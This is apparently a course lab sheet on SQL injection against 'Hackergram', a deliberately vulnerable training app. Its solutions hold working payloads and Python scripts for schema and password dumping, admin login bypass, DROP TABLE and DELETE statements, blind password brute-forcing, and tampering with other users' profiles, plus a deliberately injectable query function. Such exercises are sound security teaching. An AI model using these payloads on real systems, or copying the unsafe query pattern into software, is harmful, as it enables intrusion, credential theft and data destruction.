# SQL Injection

Hackergram is vulnerable to several types of SQLi attacks. The following exercises address these vulnerabilities. Some attacks are performed using the victim-browser and others are performed through Python scripts run at the attacker.

## Error-based SQLi

Start by obtaining information on the database software and schema. First, inject an apostrophe (') in the search field of the /users or /posts endpoints. An error message will be displayed disclosing that the software is MySQL. Next, to obtain the database schema, inject the following instruction in the search filed of the /posts endpoint (it uses union-based injection):

```
' UNION SELECT '1', TABLE_NAME, '1', '1', COLUMN_NAME, table_schema FROM INFORMATION_SCHEMA.COLUMNS -- 
```

You will learn that the database has four tables (Users, Requests, Posts, and Friends), and you will also learn which are the columns of each table. To obtain a more structured output run the script of Appendix A at the attacker.

<details>
<summary><strong>💡 Solution</strong></summary>
Execute this script on the attacker's machine:
``` py
# Gets DB version and DB schema (Search Posts)

import requests
import sys
from bs4 import BeautifulSoup

def reset(session):
    session.get(SERVER+"/reset")

def register(session):
    payload = {
        'username': "mallory",
        'name': "Mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/signup", data=payload)

def login(session):
    payload = {
        'username': "mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/login", data=payload)

def exploit(session):
    payload = {
        'search' : "' UNION SELECT -- "
    }
    r = session.get(SERVER+"/posts", params=payload)
    soup = BeautifulSoup(r.text, 'html.parser')
    h4 = soup.find('h4').text
    print("Error message:")
    print(h4)
    if "MySQL" in h4:
        print("\nDatabase is powered by MySQL")
    else:
        print("\nFailed to identify Database version")
    print("--------------------------------------\n")
    print("(Table : Column)\n")
    payload = {
        'search' : "' UNION SELECT '1', TABLE_NAME, '1', '1', COLUMN_NAME, table_schema FROM INFORMATION_SCHEMA.COLUMNS -- "
    }
    r = session.get(SERVER+"/posts", params=payload)
    soup = BeautifulSoup(r.text, 'html.parser')
    cards = soup.find_all(class_='card')
    for card in cards:
        href = card.find(class_='profile')
        if href and 'href' in href.attrs:
            table = href['href'].split('username=')[1]
            db_name = card.find(class_='card-text h6').text.strip()
            if db_name == "(hackergramdb)":
                column = card.find(class_='card-text h5').text.strip()
                print(f"{table} : {column}")


if __name__ == '__main__':
    host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
    port = '80' if len(sys.argv) < 3 else sys.argv[2]
    SERVER = "http://" + host + ":" + port
    print(SERVER)
    print("--------------------------------------\n")
    with requests.session() as s:
        reset(s)
        register(s)
        login(s)
        exploit(s)
```
</details>

## 7.2 Authentication bypass

Hackergram is vulnerable to authentication bypass attacks. In this exercise, login as admin without using its password.

<details>
<summary><strong>💡 Solution</strong></summary>

In the /login endpoint, inject 

```
admin' and 1=1 -- 

```

**Why it works:**

The SQL query becomes: `SELECT * FROM Users WHERE username='admin' and 1=1 -- ' AND password='anything'`

The `--` comments out the password check, and `1=1` is always true.

</details>

## 7.3 Union-based SQLi

Use union-based injection to dump all users and passwords from the database.

<details>
<summary><strong>💡 Solution</strong></summary>

**Method 1: Manual injection via search field**

1. **In `/posts` search field, enter:**
   ```
   ' UNION SELECT '1', username, password, '1', '1', '1' FROM Users -- 
   ```

2. **Alternative payload for better formatting:**
   ```
   ' UNION SELECT '1', CONCAT(username, ':', password), '1', '1', '1', '1' FROM Users -- 
   ```

**Method 2: Python script for automated dumping**

```py
import requests
import sys
import re

def dump_users(session):
    payload = "' UNION SELECT '1', CONCAT(username, '|', password, '|', name), '1', '1', '1', '1' FROM Users -- "
    r = session.get(SERVER+"/posts", params={"search": payload})
    
    # Extract user data from response
    users = re.findall(r'([^|]+)\|([^|]+)\|([^|]+)', r.text)
    
    print("Dumped Users:")
    print("-" * 50)
    for username, password, name in users:
        print(f"Username: {username}")
        print(f"Password: {password}")
        print(f"Name: {name}")
        print("-" * 30)

if __name__ == '__main__':
    host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
    port = '80' if len(sys.argv) < 3 else sys.argv[2]
    SERVER = "http://" + host + ":" + port
    
    with requests.session() as s:
        # Register and login first
        register(s)
        login(s)
        dump_users(s)
```

**Expected Output:**
- admin:admin123:Administrator
- mr_robot:password123:Mr Robot
- dpr:secretpass:DPR
- etc.

</details>

## Piggybacked SQLi

Use piggybacked SQLi to delete one table from Hackergram's database.

<details>
<summary><strong>💡 Solution</strong></summary>

**⚠️ Warning: This will permanently delete data!**

**Method 1: Drop table via search injection**

1. **In `/posts` search field:**
   ```
   test'; DROP TABLE Friends; -- 
   ```

2. **Alternative targets:**
   ```
   test'; DROP TABLE Requests; -- 
   test'; DROP TABLE Posts; -- 
   ```
   (Don't drop Users table as it will break authentication)

**Method 2: Python script approach**

```py
import requests
import sys

def delete_table(session, table_name):
    payload = f"test'; DROP TABLE {table_name}; -- "
    r = session.get(SERVER+"/posts", params={"search": payload})
    print(f"Attempted to drop table: {table_name}")
    return r

def verify_deletion(session, table_name):
    # Try to query the deleted table
    test_payload = f"' UNION SELECT '1', '1', '1', '1', '1', '1' FROM {table_name} -- "
    r = session.get(SERVER+"/posts", params={"search": test_payload})
    if "doesn't exist" in r.text or "Unknown table" in r.text:
        print(f"✅ Table {table_name} successfully deleted!")
    else:
        print(f"❌ Table {table_name} still exists")

if __name__ == '__main__':
    host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
    port = '80' if len(sys.argv) < 3 else sys.argv[2]
    SERVER = "http://" + host + ":" + port
    
    with requests.session() as s:
        register(s)
        login(s)
        delete_table(s, "Friends")
        verify_deletion(s, "Friends")
```

**What happens:**
The SQL query becomes: `SELECT * FROM Posts WHERE content LIKE '%test'; DROP TABLE Friends; -- %'`
This executes two statements: the original SELECT and the DROP TABLE command.

</details>

## Boolean-based SQLi

Hackergram is vulnerable to inference attacks such as Boolean-based SQLi. The following script uses this technique to bruteforce the password of the admin user by targeting the search field of the /posts endpoint:

```py
# Gets DB version and DB schema (Search Posts)

import requests
import sys
import string

def reset(session):
    session.get(SERVER+"/reset")

def register(session):
    payload = {
        'username': "mallory",
        'name': "Mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/signup", data=payload)

def login(session):
    payload = {
        'username': "mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/login", data=payload)

def exploit(session):
    base = "test' OR username='{user}' AND substr(password, {pos}, 1)='{char}' -- "
    user = 'admin'
    password = ""
    all_chars = string.ascii_letters + string.digits + string.punctuation
    for pos in range(1, 33):
        found = False
        for char in all_chars:
            payload = base.format(user=user, pos=pos, char=char)
            r = session.get(SERVER+"/posts", params={"search": payload})
            if "0 matches" not in r.text:
                print(f"Found character: {char}")
                password += char
                found = True
                break
        if not found:
            break
    print(f"\nPassword found for {user}: {password}")


if __name__ == '__main__':
    host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
    port = '80' if len(sys.argv) < 3 else sys.argv[2]
    SERVER = "http://" + host + ":" + port
    print(SERVER)
    print("--------------------------------------\n")
    with requests.session() as s:
        reset(s)
        register(s)
        login(s)
        exploit(s)
```

Run the script at the attacker and check that the attack indeed works.

!!! note "Additional exercise"

    Modify the script to obtain the same information using a time-based injection technique

<details>
<summary><strong>💡 Solution for Time-based SQLi</strong></summary>

**Time-based SQLi Script:**

```py
import requests
import sys
import string
import time

def reset(session):
    session.get(SERVER+"/reset")

def register(session):
    payload = {
        'username': "mallory",
        'name': "Mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/signup", data=payload)

def login(session):
    payload = {
        'username': "mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/login", data=payload)

def time_based_exploit(session):
    base = "test' OR (username='{user}' AND substr(password, {pos}, 1)='{char}' AND SLEEP(3)) -- "
    user = 'admin'
    password = ""
    all_chars = string.ascii_letters + string.digits + string.punctuation
    
    for pos in range(1, 33):
        found = False
        for char in all_chars:
            payload = base.format(user=user, pos=pos, char=char)
            start_time = time.time()
            r = session.get(SERVER+"/posts", params={"search": payload})
            end_time = time.time()
            
            # If response took longer than 2.5 seconds, we found the character
            if (end_time - start_time) > 2.5:
                print(f"Found character: {char}")
                password += char
                found = True
                break
        if not found:
            break
    print(f"\nPassword found for {user}: {password}")

if __name__ == '__main__':
    host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
    port = '80' if len(sys.argv) < 3 else sys.argv[2]
    SERVER = "http://" + host + ":" + port
    print(SERVER)
    print("Time-based SQLi Attack")
    print("--------------------------------------\n")
    with requests.session() as s:
        reset(s)
        register(s)
        login(s)
        time_based_exploit(s)
```

**How it works:**
- Uses `SLEEP(3)` function to delay response when condition is true
- Measures response time to determine if character is correct
- If response takes longer than 2.5 seconds, the character was found
- More reliable than boolean-based in some scenarios

</details>

## Changing other user's profile

The following function is used to update the user profile at Hackergram:

```py
# Updates user
def update_user_settings(username, name, password, bio, photo):
    query = "UPDATE Users"
    query+= " SET username='%s', password='%s', name='%s', bio='%s', photo='%s'" % (username, password, name, bio, photo)
    query+= " WHERE username = '%s'" % (username)
 
    commit_to_database(query)
    return User(username, password, name, bio, photo)
```

Based on this information, inject an instruction that changes the bio field of the dpr user to "user was pwned".

<details>
<summary><strong>💡 Solution</strong></summary>

**Analysis of the vulnerable function:**
The `update_user_settings` function uses string formatting without proper escaping, making it vulnerable to SQL injection through any of the parameters.

**Method 1: Bio field injection**

1. **In your bio field, enter:**
   ```
   normal bio'; UPDATE Users SET bio='user was pwned' WHERE username='dpr'; -- 
   ```

2. **This creates the SQL query:**
   ```sql
   UPDATE Users SET username='mallory', password='eve123', name='Mallory', bio='normal bio'; UPDATE Users SET bio='user was pwned' WHERE username='dpr'; -- ', photo='' WHERE username = 'mallory'
   ```

**Method 2: Name field injection**
```
Mallory'; UPDATE Users SET bio='user was pwned' WHERE username='dpr'; -- 
```

**Method 3: Python script to automate the attack**

```py
import requests
import sys

def reset(session):
    session.get(SERVER+"/reset")

def register(session):
    payload = {
        'username': "mallory",
        'name': "Mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/signup", data=payload)

def login(session):
    payload = {
        'username': "mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/login", data=payload)

def exploit_profile(session):
    # Malicious payload in bio field
    malicious_bio = "normal bio'; UPDATE Users SET bio='user was pwned' WHERE username='dpr'; -- "
    
    payload = {
        'username': 'mallory',
        'name': 'Mallory',
        'password': 'eve123',
        'bio': malicious_bio,
        'photo': ''
    }
    
    r = session.post(SERVER+"/settings", data=payload)
    print("Profile update sent with malicious payload")
    return r

def verify_attack(session):
    # Check if dpr's bio was changed
    r = session.get(SERVER+"/users")
    if "user was pwned" in r.text:
        print("✅ Attack successful! DPR's bio was changed.")
    else:
        print("❌ Attack failed or bio not visible.")

if __name__ == '__main__':
    host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
    port = '80' if len(sys.argv) < 3 else sys.argv[2]
    SERVER = "http://" + host + ":" + port
    print(SERVER)
    print("Profile SQLi Attack")
    print("--------------------------------------\n")
    with requests.session() as s:
        reset(s)
        register(s)
        login(s)
        exploit_profile(s)
        verify_attack(s)
```

**Why it works:**
The vulnerable string formatting allows us to break out of the current UPDATE statement and inject our own SQL commands. The `--` comments out the rest of the original query.

**Alternative payloads:**
- Change password: `'; UPDATE Users SET password='hacked' WHERE username='dpr'; -- `
- Change username: `'; UPDATE Users SET username='pwned_dpr' WHERE username='dpr'; -- `
- Delete user: `'; DELETE FROM Users WHERE username='dpr'; -- `

</details>